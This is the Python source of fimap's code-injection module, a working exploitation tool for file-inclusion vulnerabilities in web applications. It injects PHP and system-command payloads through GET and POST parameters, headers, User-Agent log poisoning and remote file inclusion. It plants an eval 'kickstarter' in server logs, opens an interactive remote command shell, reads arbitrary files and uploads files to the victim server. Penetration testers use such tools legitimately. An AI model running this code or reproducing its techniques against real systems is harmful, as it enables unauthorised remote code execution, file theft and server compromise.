#
# This file is part of fimap.
#
# Copyright(c) 2009-2010 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#
from base64 import b64decode
import pickle
import base64
import shutil
import os
import sys
from baseClass import baseClass
from config import settings
import urllib2

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$03.09.2009 03:40:49$"

shell_banner =  "-------------------------------------------\n" + \
                "Welcome to fimap shell!\n" + \
                "Better don't start interactive commands! ;)\n" +\
                "Also remember that this is not a persistent shell.\n" +\
                "Every command opens a new shell and quits it after that!\n" +\
                "Enter 'q' to exit the shell.\n"+\
                "-------------------------------------------"


class codeinjector(baseClass):
    def _load(self):
        self.report = None
        self.isLogKickstarterPresent = False

    def setReport(self, report):
        self.report = report

    def start(self):
        domain = self.chooseDomains()
        vuln   = self.chooseVuln(domain.getAttribute("hostname"))

        hostname = domain.getAttribute("hostname")
        mode = vuln.getAttribute("mode")
        fpath = vuln.getAttribute("path")
        param = vuln.getAttribute("param")
        prefix = vuln.getAttribute("prefix")
        suffix = vuln.getAttribute("suffix")
        appendix = vuln.getAttribute("appendix")
        shcode = vuln.getAttribute("file")
        paramvalue = vuln.getAttribute("paramvalue")
        kernel = domain.getAttribute("kernel")
        postdata = vuln.getAttribute("postdata")
        ispost = int(vuln.getAttribute("ispost"))
        language = vuln.getAttribute("language")
        isUnix = vuln.getAttribute("os") == "unix"
        
        vulnheaderkey           = vuln.getAttribute("header_vuln_key")
        header_dict_b64         = vuln.getAttribute("header_dict")
        header_dict = {}

        if (header_dict_b64 != ""):
            header_dict_pickle      = b64decode(header_dict_b64) 
            header_dict             = pickle.loads(header_dict_pickle)

        
        if (not isUnix and shcode[1]==":"):
            shcode = shcode[3:]
        
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()[language]
        
        plugman = self.config["PLUGINMANAGER"]
        
        if (kernel == ""): kernel = None
        payload = "%s%s%s" %(prefix, shcode, suffix)
        if (ispost == 0):
            fpath = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
        elif (ispost == 1):
            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
        elif (ispost == 2):
            tmp = header_dict[vulnheaderkey]
            tmp = tmp.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
            header_dict[vulnheaderkey] = tmp
        php_inject_works = False
        sys_inject_works = False
        working_shell    = None

        url  = "http://%s%s" %(hostname, fpath)

        code = None
        quiz, answer = langClass.generateQuiz()
        php_test_code = quiz
        php_test_result = answer


        if (mode.find("A") != -1 and mode.find("x") != -1):
            self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)
            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)

        elif (mode.find("P") != -1 and mode.find("x") != -1):
            self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)
            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
            
        elif (mode.find("L") != -1):
            if (mode.find("H") != -1):
                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
            elif (mode.find("F") != -1):
                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)
            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
            
        elif (mode.find("R") != -1):
            suffix = appendix
            if settings["dynamic_rfi"]["mode"] == "ftp":
                self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                if (ispost == 0):
                    url  = url.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                elif (ispost == 1):
                    postdata = postdata.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                elif (ispost == 2):
                    tmp = header_dict[vulnheaderkey]
                    tmp = tmp.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                    header_dict[vulnheaderkey] = tmp
                code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
                  
            elif settings["dynamic_rfi"]["mode"] == "local":
                self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                if (ispost == 0):
                    url  = url.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                elif (ispost == 1):
                    postdata = postdata.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                elif (ispost == 2):
                    tmp = header_dict[vulnheaderkey]
                    tmp = tmp.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                    header_dict[vulnheaderkey] = tmp
                code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
            else:
                print "fimap is currently not configured to exploit RFI vulnerabilities."
                sys.exit(1)
        
        if code == None:
            self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
            sys.exit(1)


        if (code.find(php_test_result) != -1):
            self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
            php_inject_works = True
            shellquiz, shellanswer = xml2config.generateShellQuiz(isUnix)
            shell_test_code = shellquiz
            shell_test_result = shellanswer
            for item in langClass.getExecMethods():
                try:
                    name = item.getName()
                    payload = None
                    if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
                        self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                        testload = item.generatePayload(shell_test_code)
                        if (mode.find("A") != -1):
                            self.setUserAgent(testload)
                            code = self.doPostRequest(url, postdata, header_dict)
                        elif (mode.find("P") != -1):
                            if (postdata != ""):
                                testload = "%s&%s" %(postdata, testload)
                            code = self.doPostRequest(url, testload, header_dict)
                        elif (mode.find("R") != -1):
                            code = self.executeRFI(url, postdata, appendix, testload, header_dict)
                        elif (mode.find("L") != -1):
                            testload = self.convertUserloadToLogInjection(testload)
                            testload = "data=" + base64.b64encode(testload)
                            if (postdata != ""):
                                testload = "%s&%s" %(postdata, testload)
                            code = self.doPostRequest(url, testload, header_dict)
                        if code != None and code.find(shell_test_result) != -1:
                            sys_inject_works = True
                            working_shell = item
                            self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
                            if (kernel == None):
                                self._log("Requesting kernel version...", self.LOG_DEBUG)
                                uname_cmd = item.generatePayload(xml2config.getKernelCode(isUnix))
                                kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
                                self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                                domain.setAttribute("kernel", kernel)
                                self.saveXML()
    
                            break
                    else:
                        self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
                         
                except KeyboardInterrupt:
                    self._log("Aborted by user.", self.LOG_WARN)
                    
            attack = None
            while (attack != "q"):
                attack = self.chooseAttackMode(language, php_inject_works, sys_inject_works, isUnix)
                

                if (type(attack) == str):
                    if (attack == "fimap_shell"):
                        
                        
                        tab_choice = []
                        ls_cmd = None
                        def complete(txt, state):
                            for tab in tab_choice:
                                if tab.startswith(txt):
                                    if not state: return tab
                                    else: state -= 1
                        
                        if (self.config["p_tabcomplete"]):
                            self._log("Setting up tab-completation...", self.LOG_DEBUG)
                            try:
                                import readline
                                readline.parse_and_bind("tab: complete")
                                readline.set_completer(complete)
                                if (isUnix):
                                    ls_cmd = "ls -m"
                                else:
                                    ls_cmd = "dir /B"
                                self._log("Epic Tab-completation enabled!", self.LOG_INFO)
                            except:
                                self._log("Epicly failed to setup readline module!", self.LOG_WARN)
                                self._log("Falling back to default exploit-shell.", self.LOG_WARN)
                        
                        
                        cmd = ""
                        print "Please wait - Setting up shell (one request)..."
                        #pwd_cmd = item.generatePayload("pwd;whoami")
                        
                        
                         
                        commands = [xml2config.getCurrentDirCode(isUnix), xml2config.getCurrentUserCode(isUnix)]
                        if (ls_cmd != None):
                            commands.append(ls_cmd)
                            
                        pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
                        tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                        if (tmp.strip() == ""):
                            print "Failed to setup shell! The resulting string was empty!"
                            break
                        
                        curdir = "<null_dir>"
                        curusr = "<null_user>"
                        if len(tmp.split("\n")) >= 2:
                            curdir = tmp.split("\n")[0].strip()
                            curusr = tmp.split("\n")[1].strip()
                        
                        if (ls_cmd != None):
                            dir_content = ",".join(tmp.split("\n")[2:])
                            tab_choice = []
                            for c in dir_content.split(","):
                                c = c.strip()
                                if (c != ""):
                                    tab_choice.append(c)
                            
                        
                        
                        if (curusr) == "":
                            curusr = "fimap"
                        
                        print shell_banner

                        while 1==1:
                            cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
                            if cmd == "q" or cmd == "quit": break
                            
                            try:
                                if (cmd.strip() != ""):
                                    commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
                                    cmds = xml2config.concatCommands(commands, isUnix)
                                    userload = item.generatePayload(cmds)
                                    code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix, headerDict=header_dict)
                                    if (cmd.startswith("cd ")):
                                        # Get Current Directory...
                                        commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
                                        cmds = xml2config.concatCommands(commands, isUnix)
                                        cmd = item.generatePayload(cmds)
                                        curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                        
                                        # Refresh Tab-Complete Cache...
                                        if (ls_cmd != None):
                                            self._log("Refreshing Tab-Completation cache...", self.LOG_DEBUG)
                                            commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), ls_cmd)
                                            cmds = xml2config.concatCommands(commands, isUnix)
                                            cmd = item.generatePayload(cmds)
                                            tab_cache = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                            if (ls_cmd != None):
                                                dir_content = ",".join(tab_cache.split("\n"))
                                                tab_choice = []
                                                for c in dir_content.split(","):
                                                    c = c.strip()
                                                    if (c != ""):
                                                        tab_choice.append(c)
                                            
                                    print code.strip()
                            except KeyboardInterrupt:
                                print "\nCancelled by user."
                        print "See ya dude!"
                        print "Do not forget to close this security hole."
                    else:
                        haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, item)
                        plugman.broadcast_callback(attack, haxhelper)
                        #ASDF
                else:
                    cpayload = attack.generatePayload()

                    shellcode = None

                    if (not attack.doInShell()):
                        shellcode = cpayload
                    else:
                        shellcode = item.generatePayload(cpayload)


                    code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
                    if (code == None):
                        print "Exploiting Failed!"
                        sys.exit(1)
                    print code.strip()
        elif (code.find(php_test_code) != -1):
            
            try:
                self._log("Injection not possible! It looks like a file disclosure bug.", self.LOG_WARN)
                self._log("fimap can currently not readout files comfortably.", self.LOG_WARN)
                go = raw_input("Do you still want to readout files (even without filtering them)? [Y/n] ")
                if (go == "Y" or go == "y" or go == ""):
                    while 1==1:
                        inp = raw_input("Absolute filepath you want to read out: ")
                        if (inp == "q"):
                            print "Fix this hole! Bye."
                            sys.exit(0)
                        payload = "%s%s%s" %(prefix, inp, suffix)
                        if (not ispost):
                            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                        else:
                            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                        url = "http://%s%s" %(hostname, path)
                        code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False, headerDict=header_dict)
                        print "--- Unfiltered output starts here ---"
                        print code
                        print "--- EOF ---"
                else:
                    print "Cancelled. If you want to read out files by hand use this URL:"
                    
                    if (not ispost):
                        path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" %(hostname, path)
                        print "URL: " + url
                    else:
                        postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" %(hostname, path)
                        print "URL          : " + url
                        print "With Postdata: " + postdata
            except KeyboardInterrupt:
                raise

        else:
            print "Failed to test injection. :("


    def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
        return(self.__doHaxRequest(url, postdata, m, payload, langClass, appendix, doFilter, headerDict=headerDict))

    def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
        code = None
        rndStart = self.getRandomStr()
        rndEnd = self.getRandomStr()
        
        userload = None
        if doFilter:
            userload = "%s %s %s" %(langClass.generatePrint(rndStart), payload, langClass.generatePrint(rndEnd))
        else:
            pass #userload = "%s%s%s" %(rndStart, payload, rndEnd)
            
        if (m.find("A") != -1):
            self.setUserAgent(userload)
            code = self.doPostRequest(url, postdata, additionalHeaders = headerDict)
        elif (m.find("P") != -1):
            if (postdata != ""): userload = "%s&%s" %(postdata, userload)
            code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
        elif (m.find("R") != -1):
            code = self.executeRFI(url, postdata, appendix, userload, headerDict)
        elif (m.find("L") != -1):
            if (not self.isLogKickstarterPresent):
                self._log("Testing if log kickstarter is present...", self.LOG_INFO)
                testcode = langClass.generateQuiz()
                p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                if (postdata != ""):
                    p = "%s&%s" %(postdata, p)
                code = self.doPostRequest(url, p)
                
                if (code == None):
                    return(None)
                
                #TODO: Cleanup this dirty block :)
                if (code.find(testcode[1]) == -1):
                    self._log("Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
                    kickstarter = langClass.getEvalKickstarter()
                    ua = self.getUserAgent()
                    self.setUserAgent(kickstarter)
                    tmpurl = None
                    if (url.find("?") != -1):
                        tmpurl = url[:url.find("?")]
                    else:
                        tmpurl = url
                    self.doGetRequest(tmpurl, additionalHeaders = headerDict)
                    self.setUserAgent(ua)
                    
                    self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                    testcode = langClass.generateQuiz()
                    p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                    if (postdata != ""):
                        p = "%s&%s" %(postdata, p)
                    code = self.doPostRequest(url, p, additionalHeaders = headerDict)

                    if (code.find(testcode[1]) == -1):
                        self._log("Failed to inject kickstarter thru UserAgent!", self.LOG_ERROR)
                        self._log("Trying to inject kickstarter thru Path...", self.LOG_INFO)
                        self._log("Ignore any 404 errors for the next request.", self.LOG_INFO)
                        kickstarter = langClass.getEvalKickstarter()
                        tmpurl = None
                        if (url.find("?") != -1):
                            tmpurl = url[:url.find("?")]
                        else:
                            tmpurl = url
                        tmpurl += "?" + kickstarter
                        self.doGetRequest(tmpurl, additionalHeaders = headerDict)
                        
                        self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                        testcode = langClass.generateQuiz()
                        p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                        if (postdata != ""):
                            p = "%s&%s" %(postdata, p)
                        code = self.doPostRequest(url, p, additionalHeaders = headerDict)
                        
                        if (code.find(testcode[1]) != -1):
                            self._log("Kickstarter successfully injected thru Path!", self.LOG_INFO)
                            self.isLogKickstarterPresent = True
                        else:
                            self._log("Failed to inject kickstarter thru Path!", self.LOG_ERROR)
                            sys.exit(1)
                    else:
                        self._log("Kickstarter successfully injected! thru UserAgent!", self.LOG_INFO)
                        self.isLogKickstarterPresent = True
                else:
                    self._log("Kickstarter found!", self.LOG_INFO)
                    self.isLogKickstarterPresent = True

            if (self.isLogKickstarterPresent):
                # Remove all <? and ?> tags.
                userload = self.convertUserloadToLogInjection(userload)
                userload = "data=" + base64.b64encode(userload)
                if (postdata != ""):
                    userload = "%s&%s" %(postdata, userload)
                code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
        if (code != None): 
            if doFilter:
                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                
        return(code)

    def testRFI(self):
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()
        
        for langName, langObj in langClass.items():
            print "Testing language %s..." %(langName)
            c, r = langObj.generateQuiz()
            
            enc_c = self.payload_encode(c)
            
            if (settings["dynamic_rfi"]["mode"] == "local"):
                print "Testing Local->RFI configuration..."
                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", "", c, {})
                if (code == enc_c):
                    print "Dynamic RFI works!"
                    for ext in langObj.getExtentions():
                        print "Testing %s interpreter..." %(ext)
                        #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ext
                        code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ext, "", ext, c, {})
                        if (code == r):
                            print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
                        else:
                            pass # Seems to be not interpreted...
                else:
                    print "Failed! Something went wrong..."
    
    
            elif (settings["dynamic_rfi"]["mode"] == "ftp"):
                print "Testing FTP->RFI configuration..."
                code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c, {})
                if (code != None):
                    code = code.strip()
                    if (code == enc_c):
                        print "Dynamic RFI works!"
                        for ext in langObj.getExtentions():
                            print "Testing %s interpreter..."%(ext)
                            #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ext
                            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c, {})
                            if (code.find(r) != -1):
                                print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
                            else:
                                pass # Seems to be not interpreted...
                                
    
                    else:
                        print "Failed! Something went wrong..."
                        print "Code: " + code;
                else:
                    print "Code == None. That's not good! Failed!"
            else:
                print "You haven't enabled and\\or configurated fimap RFI mode."
                print "Fix that in config.py"
                sys.exit(0)
            

    def convertUserloadToLogInjection(self, userload):
        userload = userload.replace("<?php", "").replace("?>", "")
        userload = userload.replace("<?", "")
        return(userload.strip())


    def chooseAttackMode(self, language, php=True, syst=True, isUnix=True):
        header = ""
        choose = {}
        textarr = []
        idx = 1
        
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()[language]
        
        if (syst):
            header = ":: Available Attacks - %s and SHELL access ::" %(language)
            textarr.append("[1] Spawn fimap shell")
            choose[1] = "fimap_shell"
            idx = 2
            for payloadobj in langClass.getPayloads():
                if (payloadobj.isForUnix() and isUnix or payloadobj.isForWindows() and not isUnix):
                    k = payloadobj.getName()
                    v = payloadobj
                    textarr.append("[%d] %s"%(idx,k))
                    choose[idx] = v
                    idx = idx +1

        else:
            header = ":: Available Attacks - %s Only ::" %(language)
            for payloadobj in langClass.getPayloads():
                k = payloadobj.getName()
                v = payloadobj
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = v
                idx = idx +1

        pluginman = self.config["PLUGINMANAGER"]
        plugin_attacks = pluginman.requestPluginActions(langClass, syst, isUnix)
        
        for attacks in plugin_attacks:
            pluginName, attackmode = attacks
            label, callback = attackmode
            textarr.append("[%d] [%s] %s" %(idx, pluginName, label))
            choose[idx] = callback
            idx += 1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        while (1==1):
            tech = raw_input("Choose Attack: ")
            try:
                if (tech.strip() == "q"):
                    sys.exit(0)
                tech = choose[int(tech)]
                return(tech)

            except Exception, err:
                print "Invalid attack. Press 'q' to break."
        
        
    def executeRFI(self, URL, postdata, appendix, content, header):
        content = self.payload_encode(content)
        
        if (appendix == "%00"): appendix = ""
        if settings["dynamic_rfi"]["mode"]=="ftp":
            up = self.FTPuploadFile(content, appendix)
            code = self.doPostRequest(URL, postdata, header)
            if up["dirstruct"]:
                self.FTPdeleteDirectory(up["ftp"])
            else:
                self.FTPdeleteFile(up["ftp"])
            return(code)
        elif settings["dynamic_rfi"]["mode"]=="local":
            up = self.putLocalPayload(content, appendix)
            code = self.doPostRequest(URL, postdata, additionalHeaders=header)
            self.deleteLocalPayload(up["local"])
            return(code)
            
    
    def payload_encode(self, content):
        if (self.config["p_rfi_encode"] != None):
            if (self.config["p_rfi_encode"] == "php_b64"):
                content = "<?php echo base64_decode(\"%s\"); ?>"%(base64.b64encode(content))
                self._log("Encoded content: %s" %(content), self.LOG_DEBUG)
            else:
                self._log("Invalid RFI encoder selected!", self.LOG_WARN);
        
        return(content)
        
    
    def chooseDomains(self, OnlyExploitable=True):
        choose = {}
        nodes = self.getDomainNodes()
        idx = 1
        header = ":: List of Domains ::"
        textarr = []
        doRemoteWarn = False
        missingCount = 0
        
        for n in nodes:
            host = n.getAttribute("hostname")
            kernel = n.getAttribute("kernel")
            if (kernel == ""): kernel = None
            showit = False
            for child in self.getNodesOfDomain(host):
                mode = child.getAttribute("mode")
                if ("x" in mode):
                    showit = True
                elif (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                    doRemoteWarn = True
                elif (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local")):
                    showit = True

            if (showit or not OnlyExploitable):
                choose[idx] = n
                if (kernel != None):
                    textarr.append("[%d] %s (%s)" %(idx, host, kernel))
                else:
                    textarr.append("[%d] %s" %(idx, host))
                idx = idx +1
            else:
                missingCount += 1
    
        textarr.append("[ ] And %d hosts with no valid attack vectors."%(missingCount))
        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        if (doRemoteWarn):
            print "WARNING: Some domains may be not listed here because dynamic_rfi is not configured! "

        while(1==1):
            c = raw_input("Choose Domain: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid Domain ID."


    def chooseVuln(self, hostname):
        choose = {}
        nodes = self.getNodesOfDomain(hostname)
        doRemoteWarn = False

        idx = 1
        header = ":: FI Bugs on '" + hostname + "' ::"
        textarr = []
        for n in nodes:
            path = n.getAttribute("path")
            file = n.getAttribute("file")
            param = n.getAttribute("param")
            mode = n.getAttribute("mode")
            ispost = int(n.getAttribute("ispost"))
            
            if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                doRemoteWarn = True

            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                choose[idx] = n
                if (ispost == 0):
                    textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
                elif (ispost == 1):
                    textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" %(idx, path, file, param))
                elif (ispost == 2):
                    textarr.append("[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'" %(idx, path, file, param))
                idx = idx +1

        if (idx == 1):
            if (doRemoteWarn):
                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
            print "This domain has no usable bugs."
            sys.exit(1)

        
        textarr.append("[q] Quit")
        self.drawBox(header, textarr)

        if (doRemoteWarn):
            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"

        while (1==1):
            c = raw_input("Choose vulnerable script: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid script ID."
                
                
class HaxHelper:
    def __init__(self, parent, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell):
        """ Initiator of HaxHelper. As plugin developer you should never use this. """
        self.parent_codeinjector = parent
        self.url = url
        self.postdata = postdata
        self.mode = mode
        self.langClass = langClass
        self.suffix = suffix
        self.isunix = isUnix
        self.issys  = sys_inject_works
        self.shell  = working_shell
        
        self.generic_lang = self.parent_codeinjector.config["XML2CONFIG"]
        
    def executeSystemCommand(self, command):
        """ Execute a system command on the vulnerable system. Returns a String which contains it's result if all OK. False if we can't inject system commands. None if something went wrong. """
        if (self.canExecuteSystemCommands()):
            cmd = self.shell.generatePayload(command)
            ret = self.parent_codeinjector._doHaxRequest(self.url, self.postdata, self.mode, cmd, self.langClass, self.suffix)
            if (ret != None):
                return(ret.strip())
            else:
                return(None)
        return(False)
    
    def executeCode(self, code):
        """ Execute interpreted code on the vulnerable system and returns it's response (filtered). """
        return(self.parent_codeinjector._doHaxRequest(self.url, self.postdata, self.mode, code, self.langClass, self.suffix).strip())
    
    def isUnix(self):
        """ Returns True if the vulnerable machine is a unix box. """
        return(self.isunix)
    
    def isWindows(self):
        """ Returns True if the vulnerable machine is a windows box. """
        return(not self.isunix)
    
    def getLangName(self):
        """ Get the language name of the vulnerable script as String. """
        return(self.langClass.getName().lower())
    
    def canExecuteSystemCommands(self):
        """ Returns True if we are able to execute system commands. Otherwise False. """
        return(self.issys)
    
    def concatCommands(self, commands):
        """ Give this command a array of system-commands and it will concat them for the vulnerable system. """
        return(self.generic_lang.concatCommands(commands, self.isunix))
    
    def getPWDCommand(self):
        """ Returns a `pwd` command for the vulnerable server. """
        return(self.generic_lang.getCurrentDirCode(self.isunix))
    
    def getUsernameCommand(self):
        """ Returns a `whoami` command for the vulnerable server. """
        return(self.generic_lang.getCurrentUserCode(self.isunix))
    
    def getConcatSymbol(self):
        """ Returns the concat symbol which is correct for the server. """
        return(self.generic_lang.getConcatSymbol(self.isunix))
    
    def generateChangeDirectoryCommand(self, newdir):
        """ Generate system-code to change directory. """
        return(self.generic_lang.generateChangeDirectoryCommand(newdir, self.isunix))
    
    def getUNAMECommand(self):
        """ Get a system-command which tells us the kernel version. """
        return(self.generic_lang.getKernelCode(self.isunix))    
    
    def uploadfile(self, lfile, rfile, chunksize=2048):
        ret = 0
        f = open(lfile, "rb")
        while 1==1:
            data = None
            if (chunksize == -1):
                data = f.read()
            else:
                data = f.read(chunksize)
                
            if (data != ""):
                bdata = base64.b64encode(data)
                code = self.langClass.generateWriteFileCode(rfile, "a", bdata)
                html = self.executeCode(code)
                if (html == "FAILED"):
                    break
                else:
                    ret = ret + len(data)
            else:
                break
        f.close()
        return(ret)